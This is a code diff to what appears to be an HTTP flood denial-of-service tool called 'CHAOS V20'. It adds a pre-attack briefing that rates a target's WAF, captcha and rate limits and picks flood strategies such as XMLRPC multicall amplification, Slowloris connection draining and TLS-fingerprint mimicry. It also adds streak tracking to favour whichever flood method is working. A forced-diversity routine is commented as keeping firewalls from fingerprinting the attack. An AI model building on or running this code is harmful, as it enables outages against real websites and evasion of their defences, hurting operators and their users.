@@ -2638,6 +2638,15 @@ class HttpFlood(Thread):
         "attack_log": [],          # Condensed log of key events for learning
         "methods_per_minute": [],  # Track method variety over time
         "cognitive_state": "LEARNING", # LEARNING -> EXPLOITING -> ADAPTING -> MASTERING
+        "briefing_shown": False,   # Whether pre-attack briefing was displayed
+        "method_streaks": {},      # method -> current consecutive success count
+        "hot_streak_method": None, # Method on a hot streak (5+ consecutive wins)
+        "total_requests_by_method": {},  # method -> total requests sent
+        "peak_damage": 0,         # Maximum damage score achieved
+        "peak_rps": 0,            # Peak requests per second observed
+        "strategy_switches": 0,   # How many times strategy was fundamentally changed
+        "last_chosen_method": None,# For diversity tracking
+        "method_diversity_window": [],  # Last 20 methods chosen for diversity score
     }
     
     # ========================================================================
@@ -2935,6 +2944,152 @@ class HttpFlood(Thread):
         """Select a random complete browser profile for header consistency."""
         return dict(randchoice(self._BROWSER_PROFILES))
     
+    def _chaos_battle_briefing(self):
+        """Display comprehensive pre-attack battle plan based on all gathered intelligence.
+        This is the AI 'thinking out loud' to show its decision-making process."""
+        intel = self._chaos_intel
+        if intel.get("briefing_shown"):
+            return
+        intel["briefing_shown"] = True
+        
+        waf = intel.get("waf_type", "unknown")
+        server = intel.get("server_type", "unknown")
+        cms = intel.get("cms_type", "custom")
+        backend = intel.get("backend_lang", "unknown")
+        framework = intel.get("backend_framework", "")
+        resource = intel.get("resource_target", "auto")
+        captcha = intel.get("has_captcha", False)
+        rate_limit = intel.get("has_rate_limit", False)
+        rt = intel.get("response_time_ms", 0)
+        discovered = intel.get("endpoints_discovered", [])
+        uncached = intel.get("uncached_paths", [])
+        threshold = intel.get("rate_limit_threshold")
+        
+        # Calculate threat assessment
+        threat_score = 0
+        if waf not in ("none", None): threat_score += 3
+        if waf in ("cloudflare", "akamai", "imperva"): threat_score += 2
+        if captcha: threat_score += 2
+        if rate_limit: threat_score += 1
+        if threshold and threshold < 10: threat_score += 2
+        
+        threat_label = {0: "MINIMAL", 1: "LOW", 2: "LOW", 3: "MODERATE", 
+                        4: "MODERATE", 5: "HIGH", 6: "HIGH", 7: "SEVERE",
+                        8: "CRITICAL", 9: "CRITICAL", 10: "EXTREME"}.get(min(threat_score, 10), "EXTREME")
+        threat_colors = {"MINIMAL": bcolors.OKGREEN, "LOW": bcolors.OKGREEN, "MODERATE": bcolors.WARNING,
+                         "HIGH": bcolors.FAIL, "SEVERE": bcolors.FAIL, "CRITICAL": bcolors.FAIL, "EXTREME": bcolors.FAIL}
+        
+        # Determine primary strategy
+        if waf in ("cloudflare", "akamai", "ddosguard"):
+            primary_strategy = "STEALTH INFILTRATION - TLS mimicry + slow connection draining"
+        elif cms == "wordpress":
+            primary_strategy = "DATABASE ANNIHILATION - XMLRPC multicall + search exhaustion"
+        elif waf == "none" and backend in ("php", "python", "ruby"):
+            primary_strategy = "CPU SATURATION - High-computation request flooding"
+        elif waf == "none" and backend in ("nodejs", "java", "aspnet"):
+            primary_strategy = "MEMORY EXHAUSTION - Slowloris + sustained connection drain"
+        elif waf == "none":
+            primary_strategy = "FULL SPECTRUM ASSAULT - All methods at maximum rate"
+        else:
+            primary_strategy = "ADAPTIVE PENETRATION - Test and exploit discovered weaknesses"
+        
+        # Experience match
+        exp_key = (waf, server, cms)
+        has_experience = exp_key in self._EXPERIENCE_DB
+        
+        # Memory from past attacks
+        has_memory = intel.get("_memory_checked") and intel.get("recon_done")
+        
+        print(f"")
+        print(f"{bcolors.OKCYAN}{'='*70}{bcolors.RESET}")
+        print(f"{bcolors.OKCYAN}  CHAOS V20 - PRE-ATTACK BATTLE BRIEFING{bcolors.RESET}")
+        print(f"{bcolors.OKCYAN}{'='*70}{bcolors.RESET}")
+        print(f"")
+        print(f"  {bcolors.BOLD}[TARGET INFRASTRUCTURE]{bcolors.RESET}")
+        print(f"    WAF        : {bcolors.WARNING}{(waf or 'none').upper()}{bcolors.RESET}")
+        print(f"    Server     : {server}")
+        print(f"    CMS        : {bcolors.OKBLUE}{(cms or 'custom').upper()}{bcolors.RESET}")
+        print(f"    Backend    : {backend}{(' / ' + framework) if framework else ''}")
+        print(f"    Latency    : {rt}ms")
+        print(f"    Captcha    : {'YES' if captcha else 'NO'}")
+        print(f"    Rate Limit : {'YES' if rate_limit else 'NO'}{(f' (threshold: {threshold} req/burst)') if threshold else ''}")
+        print(f"    Endpoints  : {len(discovered)} discovered, {len(uncached)} cache-bypassing")
+        print(f"")
+        print(f"  {bcolors.BOLD}[THREAT ASSESSMENT]{bcolors.RESET}")
+        print(f"    Level      : {threat_colors.get(threat_label, '')}{threat_label} ({threat_score}/10){bcolors.RESET}")
+        print(f"    Experience : {'VETERAN (pattern matched)' if has_experience else 'NEW TARGET (exploring)'}")
+        print(f"    Memory     : {'LOADED from previous attack' if has_memory else 'Fresh start'}")
+        print(f"")
+        print(f"  {bcolors.BOLD}[BATTLE PLAN]{bcolors.RESET}")
+        print(f"    Strategy   : {bcolors.WARNING}{primary_strategy}{bcolors.RESET}")
+        print(f"    Weak Point : {resource.upper()} ({backend} servers are weak here)")
+        print(f"    Kill Chain : RECON > PROBE > WEAKEN > BREACH > OVERWHELM > SUSTAIN")
+        print(f"")
+        print(f"{bcolors.OKCYAN}{'='*70}{bcolors.RESET}")
+        print(f"{bcolors.OKGREEN}  ENGAGING TARGET... All systems operational.{bcolors.RESET}")
+        print(f"{bcolors.OKCYAN}{'='*70}{bcolors.RESET}")
+        print(f"")
+    
+    def _chaos_hot_streak(self, method_name, success):
+        """Track and exploit hot streaks - methods that are succeeding consecutively.
+        If a method wins 5+ times in a row, it has found a gap. Exploit it harder."""
+        intel = self._chaos_intel
+        
+        if method_name not in intel["method_streaks"]:
+            intel["method_streaks"][method_name] = 0
+            
+        if success:
+            intel["method_streaks"][method_name] += 1
+            # Hot streak detected
+            if intel["method_streaks"][method_name] >= 5:
+                intel["hot_streak_method"] = method_name
+        else:
+            intel["method_streaks"][method_name] = 0
+            if intel.get("hot_streak_method") == method_name:
+                intel["hot_streak_method"] = None
+    
+    def _chaos_track_diversity(self, method_name):
+        """Track method diversity to prevent over-reliance on a single vector.
+        True expertise means using the RIGHT method, not just the SAME method."""
+        intel = self._chaos_intel
+        
+        intel["method_diversity_window"].append(method_name)
+        if len(intel["method_diversity_window"]) > 20:
+            intel["method_diversity_window"] = intel["method_diversity_window"][-20:]
+            
+        # Calculate diversity score (unique methods in last 20)
+        unique = len(set(intel["method_diversity_window"]))
+        intel["method_diversity_score"] = unique
+        
+        # Track total by method
+        if method_name not in intel["total_requests_by_method"]:
+            intel["total_requests_by_method"][method_name] = 0
+        intel["total_requests_by_method"][method_name] += 1
+    
+    def _chaos_force_diversity(self, weights, method_map):
+        """If diversity is too low (using same method >80% of time), force variety.
+        This prevents WAF from easily fingerprinting our attack pattern."""
+        intel = self._chaos_intel
+        window = intel.get("method_diversity_window", [])
+        
+        if len(window) < 10:
+            return weights
+            
+        # Check if any single method dominates >70% of recent picks
+        from collections import Counter
+        counts = Counter(window[-15:])
+        most_common_method, most_common_count = counts.most_common(1)[0]
+        
+        if most_common_count > 10:  # >66% dominance
+            # Temporarily suppress the dominant method
+            weights[most_common_method] = max(weights.get(most_common_method, 0) // 3, 2)
+            # Boost underused methods
+            for method in method_map:
+                if method not in counts and method in weights and weights[method] > 0:
+                    weights[method] = max(weights[method] * 2, 15)
+                    
+        return weights
+
     def _chaos_detect_backend(self):
         """Deep backend technology detection from response headers and behavior."""
         intel = self._chaos_intel
@@ -4360,6 +4515,12 @@ class HttpFlood(Thread):
             for m in weights:
                 weights[m] = int(weights[m] * time_mult)
                 
+        # === STRATEGY AD: Hot Streak Exploitation ===
+        hot = intel.get("hot_streak_method")
+        if hot and hot in weights and phase in ("CALIBRATE", "ASSAULT", "FINISH"):
+            # A method is on fire! Double down
+            weights[hot] = int(weights[hot] * 1.6)
+        
         # === STRATEGY AC: Cognitive State Modifiers ===
         cognitive = intel.get("cognitive_state", "LEARNING")
         if cognitive == "LEARNING":
@@ -4471,6 +4632,9 @@ class HttpFlood(Thread):
         if hasattr(self, '_current_proxy_addr'):
             self._chaos_track_proxy_affinity(method_name, self._current_proxy_addr, success)
         
+        # Track hot streaks
+        self._chaos_hot_streak(method_name, success)
+        
         # Track consecutive blocks for emergency mode
         if not success:
             intel["consecutive_block"] += 1
@@ -4528,6 +4692,10 @@ class HttpFlood(Thread):
         # Phase 1.10: KILL CHAIN PROTOCOL
         kc_phase = self._chaos_kill_chain()
         
+        # Phase 1.11: BATTLE BRIEFING (shown once after all recon is complete)
+        if intel["total_executions"] == 3 and not intel.get("briefing_shown"):
+            self._chaos_battle_briefing()
+        
         # Phase 1.8: PREDICTIVE MODELING (every 30s via health pulse)
         if intel["total_executions"] % 30 == 0:
             ttd = self._chaos_predict_ttd()
@@ -4564,6 +4732,13 @@ class HttpFlood(Thread):
         
         # Phase 2: STRATEGIC PLAN (recalculated every call with live data)
         weights = self._chaos_plan()
+        
+        # Phase 2.5: DIVERSITY ENFORCEMENT
+        weights = self._chaos_force_diversity(weights, {
+            "GET": 1, "POST": 1, "STRESS": 1, "PPS": 1, "DYN": 1,
+            "POST_DYN": 1, "SLOW_V2": 1, "XMLRPC_AMP": 1, "WP_SEARCH": 1,
+            "BOT": 1, "COOKIE": 1, "STEALTH_JA3": 1,
+        })
         
         # Phase 3: EXECUTE with intelligent method selection
         method_map = {
@@ -4628,6 +4803,12 @@ class HttpFlood(Thread):
             if least_used:
                 chosen_name = least_used
                 
+        # Priority 2.5: Hot Streak - Ride a winning method (30% chance)
+        if chosen_name == "GET" and intel.get("hot_streak_method"):
+            hot = intel["hot_streak_method"]
+            if hot in method_map and weights.get(hot, 0) > 0 and randint(1, 100) <= 30:
+                chosen_name = hot
+        
         # Priority 3: Exploit known weakpoint (20% of the time in ASSAULT+ phases)
         if chosen_name == "GET" and intel.get("target_weakpoint") and intel["phase"] in ("ASSAULT", "FINISH"):
             if randint(1, 5) <= 1:  # 20% chance to exploit weakpoint directly
@@ -4661,10 +4842,11 @@ class HttpFlood(Thread):
         
         intel["burst_counter"] += 1
         
-        # Track exploration data
+        # Track exploration + diversity data
         if chosen_name not in intel.get("methods_tried_count", {}):
             intel["methods_tried_count"][chosen_name] = 0
         intel["methods_tried_count"][chosen_name] += 1
+        self._chaos_track_diversity(chosen_name)
         
         # Track pre-execution state for observation
         pre_burned = len(BURNED_PROXIES)
@@ -4779,6 +4961,16 @@ class HttpFlood(Thread):
                 cookies_count = len(intel.get("harvested_cookies", {}))
                 if cookies_count:
                     print(f"  Cookies     : {cookies_count} harvested (trust level: HIGH)")
+                hot = intel.get("hot_streak_method")
+                if hot:
+                    streak_len = intel.get("method_streaks", {}).get(hot, 0)
+                    print(f"  Hot Streak  : {bcolors.OKGREEN}{hot} ({streak_len} consecutive wins!){bcolors.RESET}")
+                diversity = intel.get("method_diversity_score", 0)
+                total_by = intel.get("total_requests_by_method", {})
+                if total_by:
+                    top3 = sorted(total_by.items(), key=lambda x: -x[1])[:3]
+                    usage_str = " | ".join([f"{m}:{c}" for m, c in top3])
+                    print(f"  Diversity   : {diversity} unique methods | Top: {usage_str}")
                 print(f"{bcolors.OKCYAN}================================================================{bcolors.RESET}")
                 print(f"")
                 
